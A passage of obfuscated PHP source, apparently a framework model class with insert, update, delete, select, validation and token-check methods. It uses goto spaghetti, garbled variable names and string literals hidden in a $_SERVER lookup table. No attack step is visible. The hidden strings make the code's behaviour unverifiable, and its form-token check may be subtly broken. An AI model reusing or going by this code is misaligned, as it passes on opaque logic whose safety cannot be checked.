_facade($B’Ø÷«ç¶ˆ) { $A»í™­©‹  =& $_SERVER[…ë˜õ]; if (!empty($this->fields)) { foreach ($B’Ø÷«ç¶ˆ as $dˆ»›¼Ü¼Õ => $E²ƒÕ½ÖÃñ) { if (is_array($this->fields) && !in_array($dˆ»›¼Ü¼Õ, $this->fields, !0)) { unset($B’Ø÷«ç¶ˆ[$dˆ»›¼Ü¼Õ]); } elseif (is_scalar($E²ƒÕ½ÖÃñ)) { $this->_parseType($B’Ø÷«ç¶ˆ, $dˆ»›¼Ü¼Õ); } } } if (!empty($this->options[$A»í™­©‹ [266]])) { $B’Ø÷«ç¶ˆ = array_map($this->options[$A»í™­©‹ [266]], $B’Ø÷«ç¶ˆ); unset($this->options[$A»í™­©‹ [266]]); } $this->_beforeWrite($B’Ø÷«ç¶ˆ); return $B’Ø÷«ç¶ˆ; } protected function _beforeWrite(&$e‰¸ø¢‚Ğ) { } public function add($e¯ùÉƒƒ³â = '', $fº½¿¸é¦ = array(), $béº¬”¬è¦ = false) { goto dæÌÑß‰¨÷; Aœç³²è: return $c¤Ò´Õ¬; goto a“Úì²Ö×Ş; dæÌÑß‰¨÷: if (empty($e¯ùÉƒƒ³â)) { if (!empty($this->data)) { $e¯ùÉƒƒ³â = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[…ë˜õ][267]); return !1; } } $fº½¿¸é¦ = $this->_parseOptions($fº½¿¸é¦); $e¯ùÉƒƒ³â = $this->_facade($e¯ùÉƒƒ³â); goto Aä´‡†œá; Aä´‡†œá: if (!1 === $this->_beforeInsert($e¯ùÉƒƒ³â, $fº½¿¸é¦)) { return !1; } $c¤Ò´Õ¬ = $this->db->insert($e¯ùÉƒƒ³â, $fº½¿¸é¦, $béº¬”¬è¦); if (!1 !== $c¤Ò´Õ¬) { $BíšÏ†©˜ = $this->getLastInsID(); if ($BíšÏ†©˜) { $e¯ùÉƒƒ³â[$this->getPk()] = $BíšÏ†©˜; $this->_after_insert($e¯ùÉƒƒ³â, $fº½¿¸é¦); return $BíšÏ†©˜; } $this->_after_insert($e¯ùÉƒƒ³â, $fº½¿¸é¦); } goto Aœç³²è; a“Úì²Ö×Ş: } protected function _beforeInsert(&$FÌ†‚‚’È, $bÂ è›‹) { } protected function _after_insert($bà¡œ¬£†¤, $EåŠ‚âíæ) { } public function addAll($C¢Š¹Ëêà—, $Bßİš¶ = array(), $FŠè„òò‹ = false) { goto F®‡¼øÂ…»; C×Ù­ò†¹: return $D”Îá¨†á; goto c†ƒ¼Éî¬Ò; F®‡¼øÂ…»: $Eã–¶êÏ­ =& $_SERVER[…ë˜õ]; if (empty($C¢Š¹Ëêà—)) { $this->error = think_lang($Eã–¶êÏ­[267]); return !1; } $Bßİš¶ = $this->_parseOptions($Bßİš¶); goto E„ñ‰ØÜãğ; E„ñ‰ØÜãğ: foreach ($C¢Š¹Ëêà— as $DÑïß„î» => $c¯é®¹á©) { $C¢Š¹Ëêà—[$DÑïß„î»] = $this->_facade($c¯é®¹á©); } if (method_exists($this->db, $Eã–¶êÏ­[268])) { $D”Îá¨†á = $this->db->insertAll($C¢Š¹Ëêà—, $Bßİš¶, $FŠè„òò‹); } else { $this->startTrans(); foreach ($C¢Š¹Ëêà— as $DÑïß„î» => $c¯é®¹á©) { $D”Îá¨†á = $this->db->insert($c¯é®¹á©, $Bßİš¶, $FŠè„òò‹); } $this->commit(); } if (!1 !== $D”Îá¨†á) { $B†³¼Ù…Œ¦ = $this->getLastInsID(); if ($B†³¼Ù…Œ¦) { return $B†³¼Ù…Œ¦; } } goto C×Ù­ò†¹; c†ƒ¼Éî¬Ò: } public function selectAdd($aÃœ¥ãğ = '', $dÏğ¡Òâñ = '', $c¿Ñîƒçéá = array()) { $f™„§‘‹§’ =& $_SERVER[…ë˜õ]; $c¿Ñîƒçéá = $this->_parseOptions($c¿Ñîƒçéá); if (!1 === ($DŸÈÁ’¥ÉÖ = $this->db->selectInsert($aÃœ¥ãğ ? $aÃœ¥ãğ : $c¿Ñîƒçéá[$f™„§‘‹§’[269]], $dÏğ¡Òâñ ? $dÏğ¡Òâñ : $this->getTableName(), $c¿Ñîƒçéá))) { $this->error = think_lang($f™„§‘‹§’[270]); return !1; } else { return $DŸÈÁ’¥ÉÖ; } } public function save($cÛÕ•˜è¼ë = '', $d›»„ÁÂÏí = array()) { goto E¹ÌÓÊèË; BºÓ‘¬£¬: if (is_array($d›»„ÁÂÏí[$B·ù¡ëìĞ”[271]]) && isset($d›»„ÁÂÏí[$B·ù¡ëìĞ”[271]][$bÂ¿¨íµõ])) { $E©ŒßÕÅÆ = $d›»„ÁÂÏí[$B·ù¡ëìĞ”[271]][$bÂ¿¨íµõ]; } if (!1 === $this->_beforeUpdate($cÛÕ•˜è¼ë, $d›»„ÁÂÏí)) { return !1; } $eìŸÜËº† = $this->db->update($cÛÕ•˜è¼ë, $d›»„ÁÂÏí); goto FË¼Œ„¤‡; E¹ÌÓÊèË: $B·ù¡ëìĞ” =& $_SERVER[…ë˜õ]; if (empty($cÛÕ•˜è¼ë)) { if (!empty($this->data)) { $cÛÕ•˜è¼ë = $this->data; $this->data = array(); } else { $this->error = think_lang($B·ù¡ëìĞ”[267]); return !1; } } $cÛÕ•˜è¼ë = $this->_facade($cÛÕ•˜è¼ë); goto C†ôµéÁÄ; C†ôµéÁÄ: $d›»„ÁÂÏí = $this->_parseOptions($d›»„ÁÂÏí); $bÂ¿¨íµõ = $this->getPk(); if (!isset($d›»„ÁÂÏí[$B·ù¡ëìĞ”[271]])) { if (isset($cÛÕ•˜è¼ë[$bÂ¿¨íµõ])) { $d¢¥Ÿ¿”‰Æ[$bÂ¿¨íµõ] = $cÛÕ•˜è¼ë[$bÂ¿¨íµõ]; $d›»„ÁÂÏí[$B·ù¡ëìĞ”[271]] = $d¢¥Ÿ¿”‰Æ; unset($cÛÕ•˜è¼ë[$bÂ¿¨íµõ]); } else { $this->error = think_lang($B·ù¡ëìĞ”[270]); return !1; } } goto BºÓ‘¬£¬; FË¼Œ„¤‡: if (!1 !== $eìŸÜËº†) { if (isset($E©ŒßÕÅÆ)) { $cÛÕ•˜è¼ë[$bÂ¿¨íµõ] = $E©ŒßÕÅÆ; } $this->_afterUpdate($cÛÕ•˜è¼ë, $d›»„ÁÂÏí); } return $eìŸÜËº†; goto A´ŒÑ° ˆ‡; A´ŒÑ° ˆ‡: } protected function _beforeUpdate(&$d¼ ï™¬È‰, $Cµ£µŞ•¼Á) { } protected function _afterUpdate($f™ÕåÄ†, $BùàÕÛ—˜´) { } public function delete($E·‘öŒÂÙê = array()) { goto a°í¸„¨“¤; a°í¸„¨“¤: $DÚ–ğÖŞ³è =& $_SERVER[…ë˜õ]; if (empty($E·‘öŒÂÙê) && empty($this->options[$DÚ–ğÖŞ³è[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $EšîäÔ¢Î = $this->getPk(); goto A¢Ç†ìÛ³©; A¢Ç†ìÛ³©: if (is_numeric($E·‘öŒÂÙê) || is_string($E·‘öŒÂÙê)) { if (strpos($E·‘öŒÂÙê, $DÚ–ğÖŞ³è[47])) { $f…Ğïå¢ˆÇ[$EšîäÔ¢Î] = array($DÚ–ğÖŞ³è[272], $E·‘öŒÂÙê); } else { $f…Ğïå¢ˆÇ[$EšîäÔ¢Î] = $E·‘öŒÂÙê; } $this->options[$DÚ–ğÖŞ³è[271]] = $f…Ğïå¢ˆÇ; } $E·‘öŒÂÙê = $this->_parseOptions(); if (is_array($E·‘öŒÂÙê[$DÚ–ğÖŞ³è[271]]) && isset($E·‘öŒÂÙê[$DÚ–ğÖŞ³è[271]][$EšîäÔ¢Î])) { $C½¹ÑáŠøì = $E·‘öŒÂÙê[$DÚ–ğÖŞ³è[271]][$EšîäÔ¢Î]; } goto Eù¤”ˆ×š‘; Eù¤”ˆ×š‘: $dŠæÎ¯Ìòø = $this->db->delete($E·‘öŒÂÙê); if (!1 !== $dŠæÎ¯Ìòø) { $BïåÜ ÍŸ = array(); if (isset($C½¹ÑáŠøì)) { $BïåÜ ÍŸ[$EšîäÔ¢Î] = $C½¹ÑáŠøì; } $this->_after_delete($BïåÜ ÍŸ, $E·‘öŒÂÙê); } return $dŠæÎ¯Ìòø; goto bñÕ©ìÓ‘ô; bñÕ©ìÓ‘ô: } protected function _after_delete($D½¼òÕ´óõ, $EâØ„ò–…ù) { } public function select($fÙ¯Éç‹Â… = array()) { goto B”µ«ŞÃÌ; fâÇ¾ä“«‡: $B†…©Ä«é‹ = $this->db->select($fÙ¯Éç‹Â…); if (!1 === $B†…©Ä«é‹) { return !1; } if (empty($B†…©Ä«é‹)) { return null; } goto aÃŒôê“Øà; aÃŒôê“Øà: $this->_afterSelect($B†…©Ä«é‹, $fÙ¯Éç‹Â…); return $B†…©Ä«é‹; goto aĞÄ“éÃ®; B”µ«ŞÃÌ: $fŸ®Ä’¤¶ =& $_SERVER[…ë˜õ]; if (is_string($fÙ¯Éç‹Â…) || is_numeric($fÙ¯Éç‹Â…)) { $cÆ²‡øÙŸ = $this->getPk(); if (strpos($fÙ¯Éç‹Â…, $fŸ®Ä’¤¶[47])) { $Aœ‡Õ´¶„[$cÆ²‡øÙŸ] = array($fŸ®Ä’¤¶[272], $fÙ¯Éç‹Â…); } else { $Aœ‡Õ´¶„[$cÆ²‡øÙŸ] = $fÙ¯Éç‹Â…; } $this->options[$fŸ®Ä’¤¶[271]] = $Aœ‡Õ´¶„; } elseif (!1 === $fÙ¯Éç‹Â…) { $fÙ¯Éç‹Â… = $this->_parseOptions(); return $fŸ®Ä’¤¶[273] . $this->db->buildSelectSql($fÙ¯Éç‹Â…) . $fŸ®Ä’¤¶[274]; } $fÙ¯Éç‹Â… = $this->_parseOptions(); goto fâÇ¾ä“«‡; aĞÄ“éÃ®: } protected function _afterSelect(&$f­Û—„ªŠÑ, $D©Û—‹‘½¡) { } public function buildSql($e” Š—˜óÕ = array()) { $eçÅˆÎ¿Áî =& $_SERVER[…ë˜õ]; $e” Š—˜óÕ = $this->_parseOptions($e” Š—˜óÕ); return $eçÅˆÎ¿Áî[273] . $this->db->buildSelectSql($e” Š—˜óÕ) . $eçÅˆÎ¿Áî[274]; } public function optionsValue($c™Ğùå„¹‹ = null) { if (is_null($c™Ğùå„¹‹)) { return $this->options; } elseif (is_array($c™Ğùå„¹‹)) { $this->options = array_merge($this->options, $c™Ğùå„¹‹); } } protected function _parseOptions($D£ä¨ÆøŞ” = array()) { goto e¸‚—‚¾İŞ; AÔ°™î¤¨À: if (!isset($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[275]])) { $D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[275]] = $this->getTableName(); $a’ª¼Òšãª = $this->fields; } else { $a’ª¼Òšãª = $this->getDbFields(); } if (!empty($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[276]])) { $D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[275]] .= $AŞ¤ô‰ŸŞõ[50] . $D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[276]]; } $D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[277]] = $this->name; goto eé†ƒ‚ºÄ«; e¸‚—‚¾İŞ: $AŞ¤ô‰ŸŞõ =& $_SERVER[…ë˜õ]; if (is_array($D£ä¨ÆøŞ”)) { $D£ä¨ÆøŞ” = array_merge($this->options, $D£ä¨ÆøŞ”); } $this->options = array(); goto AÔ°™î¤¨À; eé†ƒ‚ºÄ«: if (isset($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[271]]) && is_array($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[271]]) && !empty($a’ª¼Òšãª) && !isset($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[278]]) && !isset($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[275]])) { foreach ($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[271]] as $b·¤²ˆÅÙ => $CÆ¬µ¶‰â˜) { $b·¤²ˆÅÙ = trim($b·¤²ˆÅÙ); if (in_array($b·¤²ˆÅÙ, $a’ª¼Òšãª, !0)) { if (is_scalar($CÆ¬µ¶‰â˜)) { $this->_parseType($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[271]], $b·¤²ˆÅÙ); } } elseif (!is_numeric($b·¤²ˆÅÙ) && $AŞ¤ô‰ŸŞõ[70] != substr($b·¤²ˆÅÙ, 0, 1) && !1 === strpos($b·¤²ˆÅÙ, $AŞ¤ô‰ŸŞõ[94]) && !1 === strpos($b·¤²ˆÅÙ, $AŞ¤ô‰ŸŞõ[256]) && !1 === strpos($b·¤²ˆÅÙ, $AŞ¤ô‰ŸŞõ[279]) && !1 === strpos($b·¤²ˆÅÙ, $AŞ¤ô‰ŸŞõ[280])) { unset($D£ä¨ÆøŞ”[$AŞ¤ô‰ŸŞõ[271]][$b·¤²ˆÅÙ]); } } } $this->_options_filter($D£ä¨ÆøŞ”); return $D£ä¨ÆøŞ”; goto AáÏîÃÒ©¨; AáÏîÃÒ©¨: } protected function _options_filter(&$f„åæ¦æÆƒ) { } protected function _parseType(&$aöøæË¿Œ, $B¢ùææù’í) { $d˜«¥ÈÏÊ´ =& $_SERVER[…ë˜õ]; if (empty($this->options[$d˜«¥ÈÏÊ´[281]][$d˜«¥ÈÏÊ´[4] . $B¢ùææù’í])) { $f‡ĞˆŸÏÉÎ = strtolower($this->fields[$d˜«¥ÈÏÊ´[248]][$B¢ùææù’í]); if (!1 !== strpos($f‡ĞˆŸÏÉÎ, $d˜«¥ÈÏÊ´[282])) { } elseif (!1 === strpos($f‡ĞˆŸÏÉÎ, $d˜«¥ÈÏÊ´[283]) && !1 !== strpos($f‡ĞˆŸÏÉÎ, $d˜«¥ÈÏÊ´[284])) { $aöøæË¿Œ[$B¢ùææù’í] = intval($aöøæË¿Œ[$B¢ùææù’í]); } elseif (!1 !== strpos($f‡ĞˆŸÏÉÎ, $d˜«¥ÈÏÊ´[285]) || !1 !== strpos($f‡ĞˆŸÏÉÎ, $d˜«¥ÈÏÊ´[286])) { $aöøæË¿Œ[$B¢ùææù’í] = floatval($aöøæË¿Œ[$B¢ùææù’í]); } elseif (!1 !== strpos($f‡ĞˆŸÏÉÎ, $d˜«¥ÈÏÊ´[287])) { $aöøæË¿Œ[$B¢ùææù’í] = (bool) $aöøæË¿Œ[$B¢ùææù’í]; } } } public function find($EŠ°–…Ú‰¨ = array()) { goto föÉ±®øĞ; föÉ±®øĞ: $bÁÙĞÚ×Ã =& $_SERVER[…ë˜õ]; if (is_numeric($EŠ°–…Ú‰¨) || is_string($EŠ°–…Ú‰¨)) { $b««ˆÓì²[$this->getPk()] = intval($EŠ°–…Ú‰¨); $this->options[$bÁÙĞÚ×Ã[271]] = $b««ˆÓì²; } $this->options[$bÁÙĞÚ×Ã[288]] = 1; goto fµ•²íµãÛ; f²­ÑŠ·™: if (!empty($this->options[$bÁÙĞÚ×Ã[289]])) { return $this->returnResult($this->data, $this->options[$bÁÙĞÚ×Ã[289]]); } return $this->data; goto b‘“ öÒùĞ; fµ•²íµãÛ: $EŠ°–…Ú‰¨ = $this->_parseOptions(); $D¸ëÀéÅèë = $this->db->select($EŠ°–…Ú‰¨); if (!1 === $D¸ëÀéÅèë) { return !1; } goto f†¼ ´‰í–; f†¼ ´‰í–: if (empty($D¸ëÀéÅèë)) { return null; } $this->data = $D¸ëÀéÅèë[0]; $this->_afterFind($this->data, $EŠ°–…Ú‰¨); goto f²­ÑŠ·™; b‘“ öÒùĞ: } protected function _afterFind(&$Cµ´ãš‚Ç, $Cİ”Ğñ„«¸) { } protected function returnResult($f¼ìÇƒâªœ, $DÑöößÏÊî = '') { $e”¯Ï‹Éôğ =& $_SERVER[…ë˜õ]; if ($DÑöößÏÊî) { if (is_callable($DÑöößÏÊî)) { return call_user_func($DÑöößÏÊî, $f¼ìÇƒâªœ); } switch (strtolower($DÑöößÏÊî)) { case $e”¯Ï‹Éôğ[290]: return json_encode($f¼ìÇƒâªœ); case $e”¯Ï‹Éôğ[291]: return xml_encode($f¼ìÇƒâªœ); } } return $f¼ìÇƒâªœ; } public function parseFieldsMap($dŒ·¥Íä²¶, $B”èÌ¹Ó é = 1) { if (!empty($this->_map)) { foreach ($this->_map as $aÕàİò‘¹ä => $f ï¦’éŠ) { if ($B”èÌ¹Ó é == 1) { if (isset($dŒ·¥Íä²¶[$f ï¦’éŠ])) { $dŒ·¥Íä²¶[$aÕàİò‘¹ä] = $dŒ·¥Íä²¶[$f ï¦’éŠ]; unset($dŒ·¥Íä²¶[$f ï¦’éŠ]); } } else { if (isset($dŒ·¥Íä²¶[$aÕàİò‘¹ä])) { $dŒ·¥Íä²¶[$f ï¦’éŠ] = $dŒ·¥Íä²¶[$aÕàİò‘¹ä]; unset($dŒ·¥Íä²¶[$aÕàİò‘¹ä]); } } } } return $dŒ·¥Íä²¶; } public function setField($e÷¤‘Ù²‚, $FÂñ¾¹±‹ = '') { if (is_array($e÷¤‘Ù²‚)) { $A£îØ®õ÷ˆ = $e÷¤‘Ù²‚; } else { $A£îØ®õ÷ˆ[$e÷¤‘Ù²‚] = $FÂñ¾¹±‹; } return $this->save($A£îØ®õ÷ˆ); } public function setAdd($A©Üª‹¥Õ•, $b£Ø¹¢ÛÍÄ = 1) { $c²…ÅÏ‡²Ì =& $_SERVER[…ë˜õ]; $a×¯Ò½×ˆë = $A©Üª‹¥Õ• . $c²…ÅÏ‡²Ì[292] . $b£Ø¹¢ÛÍÄ; if ($b£Ø¹¢ÛÍÄ < 0) { $a×¯Ò½×ˆë = $A©Üª‹¥Õ• . $b£Ø¹¢ÛÍÄ; } return $this->setField($A©Üª‹¥Õ•, array($c²…ÅÏ‡²Ì[293], $a×¯Ò½×ˆë)); } public function getField($b©ùÕÕ¶¤÷, $c••Ëô“í = null) { $aÔÄ–ÙÍŠá =& $_SERVER[…ë˜õ]; $fä«®ªéÑ‚[$aÔÄ–ÙÍŠá[269]] = $b©ùÕÕ¶¤÷; $fä«®ªéÑ‚ = $this->_parseOptions($fä«®ªéÑ‚); $b©ùÕÕ¶¤÷ = trim($b©ùÕÕ¶¤÷); if (strpos($b©ùÕÕ¶¤÷, $aÔÄ–ÙÍŠá[47])) { if (!isset($fä«®ªéÑ‚[$aÔÄ–ÙÍŠá[288]])) { $fä«®ªéÑ‚[$aÔÄ–ÙÍŠá[288]] = is_numeric($c••Ëô“í) ? $c••Ëô“í : $aÔÄ–ÙÍŠá[33]; } $f¢ç°¸ºô = $this->db->select($fä«®ªéÑ‚); if (!empty($f¢ç°¸ºô)) { goto Bò›«ÛàŞ; D‹’ƒÎ¬”: foreach ($f¢ç°¸ºô as $d…ÕêãÊ) { $d™¨İŞÒß¨ = $d…ÕêãÊ[$dóÛä…ßôå]; if (2 == $BÆÊ¨Š¦±®) { $B®‘›Š“Ÿæ[$d™¨İŞÒß¨] = $d…ÕêãÊ[$CùŸšùß•ğ]; } else { $B®‘›Š“Ÿæ[$d™¨İŞÒß¨] = is_string($c••Ëô“í) ? implode($c••Ëô“í, $d…ÕêãÊ) : $d…ÕêãÊ; } } return $B®‘›Š“Ÿæ; goto Aøºß¨áÊ; Bò›«ÛàŞ: $Bá§ŠŞ‰ÏŒ = explode($aÔÄ–ÙÍŠá[47], $b©ùÕÕ¶¤÷); $b©ùÕÕ¶¤÷ = array_keys($f¢ç°¸ºô[0]); $dóÛä…ßôå = array_shift($b©ùÕÕ¶¤÷); goto DÕƒ™ÚˆÅ; DÕƒ™ÚˆÅ: $CùŸšùß•ğ = array_shift($b©ùÕÕ¶¤÷); $B®‘›Š“Ÿæ = array(); $BÆÊ¨Š¦±® = count($Bá§ŠŞ‰ÏŒ); goto D‹’ƒÎ¬”; Aøºß¨áÊ: } } else { if (!0 !== $c••Ëô“í) { $fä«®ªéÑ‚[$aÔÄ–ÙÍŠá[288]] = is_numeric($c••Ëô“í) ? $c••Ëô“í : 1; } if ($c••Ëô“í === $aÔÄ–ÙÍŠá[251]) { unset($fä«®ªéÑ‚[$aÔÄ–ÙÍŠá[288]]); } $d…ÕêãÊ = $this->db->select($fä«®ªéÑ‚); if (!empty($d…ÕêãÊ)) { if ($c••Ëô“í === $aÔÄ–ÙÍŠá[251]) { return reset($d…ÕêãÊ[0]); } if (!0 !== $c••Ëô“í && 1 == $fä«®ªéÑ‚[$aÔÄ–ÙÍŠá[288]]) { return reset($d…ÕêãÊ[0]); } foreach ($d…ÕêãÊ as $cÊ¢…Åå¿´) { $d“İÆÃŞ[] = $cÊ¢…Åå¿´[$b©ùÕÕ¶¤÷]; } return $d“İÆÃŞ; } } return null; } public function create($AÉ†ºÆª = '', $b¹âŠ¡Ãò® = '') { goto a¹ù´¹£Ë±; bêŠ³ÄÑ’„: return $AÉ†ºÆª; goto dÜ•”‚øó; cäë˜áôÀã: $AÉ†ºÆª = $this->parseFieldsMap($AÉ†ºÆª, 0); $b¹âŠ¡Ãò® = $b¹âŠ¡Ãò® ? $b¹âŠ¡Ãò® : (!empty($AÉ†ºÆª[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$e¹É¬ç¨ñ[269]])) { $AùÍš³Óæ” = $this->options[$e¹É¬ç¨ñ[269]]; unset($this->options[$e¹É¬ç¨ñ[269]]); } elseif ($b¹âŠ¡Ãò® == THINK_MODEL_INSERT && isset($this->insertFields)) { $AùÍš³Óæ” = $this->insertFields; } elseif ($b¹âŠ¡Ãò® == THINK_MODEL_UPDATE && isset($this->updateFields)) { $AùÍš³Óæ” = $this->updateFields; } goto e÷µêš¦‰; BÏó¶õ§¢É: if ($this->autoCheckFields) { $AùÍš³Óæ” = $this->getDbFields(); foreach ($AÉ†ºÆª as $cèÆÉËÁß => $aí³šÌ­Œ) { if (!in_array($cèÆÉËÁß, $AùÍš³Óæ”)) { unset($AÉ†ºÆª[$cèÆÉËÁß]); } elseif (MAGIC_QUOTES_GPC && is_string($aí³šÌ­Œ)) { $AÉ†ºÆª[$cèÆÉËÁß] = stripslashes($aí³šÌ­Œ); } } } $this->autoOperation($AÉ†ºÆª, $b¹âŠ¡Ãò®); $this->data = $AÉ†ºÆª; goto bêŠ³ÄÑ’„; a¹ù´¹£Ë±: $e¹É¬ç¨ñ =& $_SERVER[…ë˜õ]; if (empty($AÉ†ºÆª)) { $AÉ†ºÆª = $_POST; } elseif (is_object($AÉ†ºÆª)) { $AÉ†ºÆª = get_object_vars($AÉ†ºÆª); } if (empty($AÉ†ºÆª) || !is_array($AÉ†ºÆª)) { $this->error = think_lang($e¹É¬ç¨ñ[267]); return !1; } goto cäë˜áôÀã; e÷µêš¦‰: if (isset($AùÍš³Óæ”)) { if (is_string($AùÍš³Óæ”)) { $AùÍš³Óæ” = explode($e¹É¬ç¨ñ[47], $AùÍš³Óæ”); } if (think_config($e¹É¬ç¨ñ[294])) { $AùÍš³Óæ”[] = think_config($e¹É¬ç¨ñ[295]); } foreach ($AÉ†ºÆª as $cèÆÉËÁß => $aí³šÌ­Œ) { if (!in_array($cèÆÉËÁß, $AùÍš³Óæ”)) { unset($AÉ†ºÆª[$cèÆÉËÁß]); } } } if (!$this->autoValidation($AÉ†ºÆª, $b¹âŠ¡Ãò®)) { return !1; } if (!$this->autoCheckToken($AÉ†ºÆª)) { $this->error = think_lang($e¹É¬ç¨ñ[296]); return !1; } goto BÏó¶õ§¢É; dÜ•”‚øó: } public function autoCheckToken($CĞ·î§¢) { $b¼ßØïƒÎÇ =& $_SERVER[…ë˜õ]; if (isset($this->options[$b¼ßØïƒÎÇ[297]]) && !$this->options[$b¼ßØïƒÎÇ[297]]) { return !0; } if (think_config($b¼ßØïƒÎÇ[294])) { $F‰·•ÉİÄñ = think_config($b¼ßØïƒÎÇ[295]); if (!isset($CĞ·î§¢[$F‰·•ÉİÄñ]) || Session::get($F‰·•ÉİÄñ)) { return !1; } list($A‘ñœ½ÓÃ˜, $aí“çÎâ—) = explode($b¼ßØïƒÎÇ[70], $CĞ·î§¢[$F‰·•ÉİÄñ]); if ($aí“çÎâ— && Session::get($F‰·•ÉİÄñ . $b¼ßØïƒÎÇ[94] . $A‘ñœ½ÓÃ˜) === $aí“çÎâ—) { Session::remove($F‰·•ÉİÄñ . $b¼ßØïƒÎÇ[94] . $A‘ñœ½ÓÃ˜); return !0; } if (think_config($b¼ßØïƒÎÇ[298])) { Session::remove($F‰·•ÉİÄñ . $b¼ßØïƒÎÇ[94] . $A‘ñœ½ÓÃ˜); } return !1; } return !0; } public function regex($C¸†Ğ¬¶Ú…, $DŠ×»è­«£) { $cßƒ›ÈƒÌô =& $_SERVER[…ë˜õ]; $C£ô¿Õ î‹ = array($cßƒ›ÈƒÌô[299] => $cßƒ›ÈƒÌô[300], $cßƒ›ÈƒÌô[301] => $cßƒ›ÈƒÌô[302], $cßƒ›ÈƒÌô[303] => $cßƒ›ÈƒÌô[304], $cßƒ›ÈƒÌô[305] => $cßƒ›ÈƒÌô[306], $cßƒ›ÈƒÌô[307] => $cßƒ›ÈƒÌô[308], $cßƒ›ÈƒÌô[309] => $cßƒ›ÈƒÌô[310], $cßƒ›ÈƒÌô[311] => $cßƒ›ÈƒÌô[312], $cßƒ›ÈƒÌô[286] => $cßƒ›ÈƒÌô[313], $cßƒ›ÈƒÌô[314] => $cßƒ›ÈƒÌô[315]); if (isset($C£ô¿Õ î‹[strtolower($DŠ×»è­«£)])) { $DŠ×»è­«£ = $C£ô¿Õ î‹[strtolower($DŠ×»è­«£)]; } return preg_match($DŠ×»è­«£, $C¸†Ğ¬¶Ú…) === 1; } private function autoOperation(&$D¼ÀİÓ¡¸è, $câ×ˆÕø„‡) { $FÙŒ•å§Ş =& $_SERVER[…ë˜õ]; if (!empty($this->options[$FÙŒ•å§Ş[316]])) { $cí±…ÁÄ§ = $this->options[$FÙŒ•å§Ş[316]]; unset($this->options[$FÙŒ•å§Ş[316]]); } elseif (!empty($this->_auto)) { $cí±…ÁÄ§ = $this->_auto; } if (isset($cí±…ÁÄ§)) { foreach ($cí±…ÁÄ§ as $FÛËÆì×ÃÉ) { if (empty($FÛËÆì×ÃÉ[2])) { $FÛËÆì×ÃÉ[2] = THINK_MODEL_INSERT; } if ($câ×ˆÕø„‡ == $FÛËÆì×ÃÉ[2] || $FÛËÆì×ÃÉ[2] == THINK_MODEL_BOTH) { switch (trim($FÛËÆì×ÃÉ[3])) { case $FÙŒ•å§Ş[317]: case $FÙŒ•å§Ş[318]: $Bß÷Åö«§á = isset($FÛËÆì×ÃÉ[4]) ? (array) $FÛËÆì×ÃÉ[4] : array(); if (isset($D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]])) { array_unshift($Bß÷Åö«§á, $D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]]); } if ($FÙŒ•å§Ş[317] == $FÛËÆì×ÃÉ[3]) { $D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]] = call_user_func_array($FÛËÆì×ÃÉ[1], $Bß÷Åö«§á); } else { $D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]] = call_user_func_array(array(&$this, $FÛËÆì×ÃÉ[1]), $Bß÷Åö«§á); } break; case $FÙŒ•å§Ş[269]: $D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]] = $D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[1]]; break; case $FÙŒ•å§Ş[319]: if ($FÙŒ•å§Ş[33] === $D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]]) { unset($D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]]); } break; case $FÙŒ•å§Ş[320]: default: $D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]] = $FÛËÆì×ÃÉ[1]; } if (!1 === $D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]]) { unset($D¼ÀİÓ¡¸è[$FÛËÆì×ÃÉ[0]]); } } } } return $D¼ÀİÓ¡¸è; } protected function autoValidation($C½ÆÓ¶ëÇå, $C–ñ»ã¾±Ş) { $B¶±Ç«å‹ =& $_SERVER[…ë˜õ]; if (!empty($this->options[$B¶±Ç«å‹[321]])) { $C×­…¯‰ˆã = $this->options[$B¶±Ç«å‹[321]]; unset($this->options[$B¶±Ç«å‹[321]]); } elseif (!empty($this->_validate)) { $C×­…¯‰ˆã = $this->_validate; } if (isset($C×­…¯‰ˆã)) { if ($this->patchValidate) { $this->error = array(); } foreach ($C×­…¯‰ˆã as $B„Û‚ñá¤ => $D¬áÈøãºÇ) { if (empty($D¬áÈøãºÇ[5]) || $D¬áÈøãºÇ[5] == THINK_MODEL_BOTH || $D¬áÈøãºÇ[5] == $C–ñ»ã¾±Ş) { if (0 == strpos($D¬áÈøãºÇ[2], $B¶±Ç«å‹[322]) && strpos($D¬áÈøãºÇ[2], $B¶±Ç«å‹[323])) { $D¬áÈøãºÇ[2] = think_lang(substr($D¬áÈøãºÇ[2], 2, -1)); } $D¬áÈøãºÇ[3] = isset($D¬áÈøãºÇ[3]) ? $D¬áÈøãºÇ[3] : THINK_EXISTS_VALIDATE; $D¬áÈøãºÇ[4] = isset($D¬áÈøãºÇ[4]) ? $D¬áÈøãºÇ[4] : $B¶±Ç«å‹[324]; switch ($D¬áÈøãºÇ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($C½ÆÓ¶ëÇå, $D¬áÈøãºÇ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($B¶±Ç«å‹[33] != trim($C½ÆÓ¶ëÇå[$D¬áÈøãºÇ[0]])) { if (!1 === 